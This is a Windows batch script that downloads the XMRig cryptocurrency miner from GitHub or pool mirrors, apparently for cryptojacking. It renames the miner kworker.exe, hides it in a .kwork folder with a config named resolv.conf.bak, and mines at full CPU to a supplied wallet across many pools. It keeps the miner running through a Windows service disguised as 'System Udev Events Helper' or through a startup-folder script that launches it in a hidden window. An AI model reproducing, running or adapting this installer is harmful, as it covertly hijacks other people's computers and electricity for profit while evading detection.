@echo off
setlocal enabledelayedexpansion

set VERSION=4.2-unified-multi-pool-stealth-safe

set C3POOL_DOWNLOAD_URL=https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz
set BACKUP_DOWNLOAD_URL=https://raw.githubusercontent.com/melonlonmeo/c4/refs/heads/main/xmrig.tar.gz
set XMRIG_LATEST_API=https://api.github.com/repos/xmrig/xmrig/releases/latest

set DISGUISE_BIN=kworker.exe
set SERVICE_NAME=systemd-udevd-helper
set DIR_SUFFIX=.kwork
set CONFIG_NAME=resolv.conf.bak
set WRAPPER_NAME=udev-helper.bat

set KEEP_CONFIG=%KEEP_CONFIG%
if "%KEEP_CONFIG%"=="" set KEEP_CONFIG=0
set KEEP_BINARY=%KEEP_BINARY%
if "%KEEP_BINARY%"=="" set KEEP_BINARY=0
set STOP_UDEV=%STOP_UDEV%
if "%STOP_UDEV%"=="" set STOP_UDEV=0

set WALLET=%1
set EMAIL=%2
set PASS=x

net session >nul 2>&1
if %errorLevel% == 0 (set ADMIN=1) else (set ADMIN=0)

if "%WALLET%"=="" (
  echo Setup script v%VERSION%
  echo Usage: %0 ^<wallet address or USDT TRC20 address^> [email]
  exit /b 1
)

for /f "delims=." %%a in ("%WALLET%") do set WALLET_BASE=%%a

if ["%USERPROFILE%"] == [""] (
  echo ERROR: Please define USERPROFILE environment variable to your user directory
  exit /b 1
)

if not exist "%USERPROFILE%" (
  echo ERROR: Please make sure user directory %USERPROFILE% exists
  exit /b 1
)

where powershell >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "powershell" utility to work correctly
  exit /b 1
)

rem Kiểm tra định dạng ví chuẩn
set WALLET_TYPE=
for /f "tokens=*" %%a in ('powershell -NoProfile -Command "$w = $env:WALLET_BASE; $b = '[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]'; if ($w -cmatch ('^[48]' + $b + '{94}$') -or $w -cmatch ('^[48]' + $b + '{105}$')) { 'XMR' } elseif ($w -cmatch ('^T' + $b + '{33}$')) { 'USDT-TRON' } elseif ($w -cmatch '^0x[0-9a-fA-F]{40}$') { 'USDT-EVM' } elseif ($w -cmatch ('^' + $b + '{32,44}$')) { 'USDT-Solana' }"') do set WALLET_TYPE=%%a
if [%WALLET_TYPE%] == [] (
  echo ERROR: Wrong wallet address: %WALLET_BASE%
  echo Supported addresses: XMR ^(95 or 106 chars^), USDT-TRON ^(T...^), USDT-BSC/Polygon ^(0x...^), USDT-Solana
  exit /b 1
)
echo Wallet address type: %WALLET_TYPE%
echo.

set "INSTALL_DIR=%USERPROFILE%\%DIR_SUFFIX%"
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1
set ARCHIVE=%INSTALL_DIR%\.pkg.tar.gz
if not exist "%INSTALL_DIR%\logs" mkdir "%INSTALL_DIR%\logs" >nul 2>&1

rem Tính toán phần cứng chi tiết qua WMI
for /f "tokens=*" %%a in ('powershell -NoProfile -Command "@(Get-WmiObject Win32_Processor).Count"') do set CPU_SOCKETS=%%a
if [%CPU_SOCKETS%] == [] set CPU_SOCKETS=1

for /f "tokens=*" %%a in ('powershell -NoProfile -Command "@(Get-WmiObject Win32_Processor)[0].NumberOfCores"') do set CPU_CORES_PER_SOCKET=%%a
if [%CPU_CORES_PER_SOCKET%] == [] set CPU_CORES_PER_SOCKET=1

for /f "tokens=*" %%a in ('powershell -NoProfile -Command "@(Get-WmiObject Win32_Processor)[0].NumberOfLogicalProcessors"') do set CPU_THREADS=%%a
if [%CPU_THREADS%] == [] set CPU_THREADS=1
set /a "CPU_THREADS = %CPU_SOCKETS% * %CPU_THREADS%"

for /f "tokens=*" %%a in ('powershell -NoProfile -Command "@(Get-WmiObject Win32_Processor)[0].MaxClockSpeed"') do set CPU_MHZ=%%a
if [%CPU_MHZ%] == [] set CPU_MHZ=1000

for /f "tokens=*" %%a in ('powershell -NoProfile -Command "@(Get-WmiObject Win32_Processor)[0].L2CacheSize"') do set CPU_L2_CACHE=%%a
if [%CPU_L2_CACHE%] == [] set CPU_L2_CACHE=256

for /f "tokens=*" %%a in ('powershell -NoProfile -Command "@(Get-WmiObject Win32_Processor)[0].L3CacheSize"') do set CPU_L3_CACHE=%%a
if [%CPU_L3_CACHE%] == [] set CPU_L3_CACHE=2048

set /a "TOTAL_CACHE = %CPU_SOCKETS% * (%CPU_L2_CACHE% / %CPU_CORES_PER_SOCKET% + %CPU_L3_CACHE%)"
set /a "CACHE_THREADS = %TOTAL_CACHE% / 2048"

if %CPU_THREADS% lss %CACHE_THREADS% (
  set /a "EXP_MONERO_HASHRATE = %CPU_THREADS% * (%CPU_MHZ% * 20 / 1000) * 5"
) else (
  set /a "EXP_MONERO_HASHRATE = %CACHE_THREADS% * (%CPU_MHZ% * 20 / 1000) * 5"
)

if %EXP_MONERO_HASHRATE% gtr 100000 ( set PORT=23333 ) else if %EXP_MONERO_HASHRATE% gtr 50000 ( set PORT=19999 ) else if %EXP_MONERO_HASHRATE% gtr 25000 ( set PORT=15555 ) else if %EXP_MONERO_HASHRATE% gtr 5000 ( set PORT=13333 ) else ( set PORT=80 )

echo Setup script v%VERSION%
echo CPU threads: %CPU_THREADS%
echo Computed C3Pool port: %PORT%
echo Directory: %INSTALL_DIR%
echo Flags: KEEP_CONFIG=%KEEP_CONFIG% KEEP_BINARY=%KEEP_BINARY% STOP_UDEV=%STOP_UDEV%

goto MAIN_EXEC

:download_file
set "url=%~1"
set "output=%~2"
powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; try { $wc = New-Object System.Net.WebClient; $wc.DownloadFile('%url%', '%output%'); exit 0 } catch { exit 1 }"
exit /b %errorlevel%

:download_text
set "url=%~1"
powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; try { $req = [System.Net.HttpWebRequest]::Create('%url%'); $req.Accept = 'application/vnd.github+json'; $req.UserAgent = 'unified-installer'; $res = $req.GetResponse(); $sr = New-Object System.IO.StreamReader($res.GetResponseStream()); $sr.ReadToEnd(); } catch {}"
exit /b

:MAIN_EXEC

if %ADMIN% == 1 (
  sc stop %SERVICE_NAME% >nul 2>&1
  sc delete %SERVICE_NAME% >nul 2>&1
)

powershell -NoProfile -Command "Get-Process -ErrorAction SilentlyContinue | Where-Object {$_.Path -and $_.Path.StartsWith('%INSTALL_DIR%', 'OrdinalIgnoreCase')} | Stop-Process -Force" >nul 2>&1

echo [*] Preparing package

if "%KEEP_BINARY%"=="1" if exist "%INSTALL_DIR%\%DISGUISE_BIN%" (
  echo [*] KEEP_BINARY=1 - giữ binary hiện tại
  goto SKIP_DOWNLOAD
)

rem Lấy bản GitHub mới nhất hoặc dùng cơ chế fallback
set "XMRIG_URL="
for /f "tokens=*" %%a in ('call :download_text "%XMRIG_LATEST_API%"') do set "JSON_RES=%%a"
for /f "tokens=*" %%a in ('powershell -NoProfile -Command "$json = '%JSON_RES%';" ^
  "try { $obj = $json | ConvertFrom-Json; foreach($asset in $obj.assets) { if($asset.browser_download_url -match 'linux-static-x64\.tar\.gz') { Write-Output $asset.browser_download_url; break } } } catch {}"') do set "XMRIG_URL=%%a"

if not "%XMRIG_URL%"=="" (
  echo [*] Downloading latest official XMRig release...
  call :download_file "%XMRIG_URL%" "%ARCHIVE%"
)

if not exist "%ARCHIVE%" (
  echo WARNING: Official download failed. Trying C3Pool source...
  call :download_file "%C3POOL_DOWNLOAD_URL%" "%ARCHIVE%"
  if errorlevel 1 (
    echo WARNING: C3Pool download failed. Trying backup source: %BACKUP_DOWNLOAD_URL%
    call :download_file "%BACKUP_DOWNLOAD_URL%" "%ARCHIVE%"
    if errorlevel 1 (
      echo ERROR: Unable to download release or any fallbacks.
      exit /b 1
    )
  )
)

rem Giải nén gói tải về
powershell -NoProfile -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; try { [System.IO.Compression.ZipFile]::ExtractToDirectory('%ARCHIVE%', '%INSTALL_DIR%') } catch { tar -xzf '%ARCHIVE%' -C '%INSTALL_DIR%' }" >nul 2>&1
del "%ARCHIVE%" >nul 2>&1

if exist "%INSTALL_DIR%\xmrig.exe" (
  move /y "%INSTALL_DIR%\xmrig.exe" "%INSTALL_DIR%\%DISGUISE_BIN%" >nul 2>&1
) else (
  for /d %%d in ("%INSTALL_DIR%\xmrig-*") do (
    xcopy /e /y /q "%%d\*" "%INSTALL_DIR%\" >nul 2>&1
    rmdir /q /s "%%d" >nul 2>&1
  )
  if exist "%INSTALL_DIR%\xmrig.exe" move /y "%INSTALL_DIR%\xmrig.exe" "%INSTALL_DIR%\%DISGUISE_BIN%" >nul 2>&1
  if exist "%INSTALL_DIR%\xmrig" move /y "%INSTALL_DIR%\xmrig" "%INSTALL_DIR%\%DISGUISE_BIN%" >nul 2>&1
)

:SKIP_DOWNLOAD

if not exist "%INSTALL_DIR%\%DISGUISE_BIN%" (
  echo ERROR: Binary is not functional or missing.
  exit /b 1
)

set "CONFIG_PATH=%INSTALL_DIR%\%CONFIG_NAME%"
set "CONFIG_BG=%INSTALL_DIR%\.%CONFIG_NAME%.bg"

(
echo {
echo     "autosave": true,
echo     "background": false,
echo     "cpu": true,
echo     "opencl": false,
echo     "cuda": false,
echo     "pools": [
echo         { "url": "auto.c3pool.org:%PORT%", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false },
echo         { "url": "auto.c3pool.org:19999", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false },
echo         { "url": "auto.c3pool.org:443",   "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": true  },
echo         { "url": "auto.c3pool.org:80",    "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false },
echo         { "url": "auto.c3pool.org:33333", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": true  },
echo         { "url": "auto.c3pool.org:23333", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false },
echo         { "url": "pool.supportxmr.com:443",  "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": true  },
echo         { "url": "pool.supportxmr.com:8080", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false },
echo         { "url": "pool.supportxmr.com:7777", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false },
echo         { "url": "pool.supportxmr.com:5555", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false },
echo         { "url": "pool.supportxmr.com:80",   "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false },
echo         { "url": "pool.supportxmr.com:3333", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false }
echo     ],
echo     "log-file": null,
echo     "donate-level": 0,
echo     "max-cpu-usage": 100,
echo     "syslog": false
echo }
) > "%CONFIG_PATH%"

powershell -NoProfile -Command "(gc '%CONFIG_PATH%') -replace '\"background\": *false', '\"background\": true' | sc '%CONFIG_BG%'" >nul 2>&1

set "RUNNER=%INSTALL_DIR%\%WRAPPER_NAME%"
set "RUNNER_BG=%INSTALL_DIR%\.%WRAPPER_NAME%-bg.bat"

(
echo @echo off
echo cd /d "%INSTALL_DIR%"
echo start /b "" "%INSTALL_DIR%\%DISGUISE_BIN%" --config="%CONFIG_PATH%" --no-color --quiet
) > "%RUNNER%"

(
echo @echo off
echo cd /d "%INSTALL_DIR%"
echo powershell -NoProfile -Command "Start-Process '%RUNNER%' -WindowStyle Hidden"
) > "%RUNNER_BG%"

if %ADMIN% == 1 (
  echo [*] Installing Windows Service...
  sc create %SERVICE_NAME% binPath= "cmd.exe /c start /b %RUNNER% --config=%CONFIG_PATH%" start= auto DisplayName= "System Udev Events Helper" >nul 2>&1
  sc start %SERVICE_NAME% >nul 2>&1
  if errorlevel 1 set ADMIN=0
)

if %ADMIN% == 0 (
  echo [*] No admin access - persistence via Startup directory
  for %%s in (
    "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup",
    "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
  ) do (
    if exist "%%~s" (
      (
      echo @echo off
      echo call "%RUNNER_BG%"
      ) > "%%~s\udev-helper.bat"
      goto STARTUP_DONE
    )
  )
  :STARTUP_DONE
  call "%RUNNER_BG%"
)

echo [*] Setup complete - initialized
timeout /t 2 >nul
exit /b 0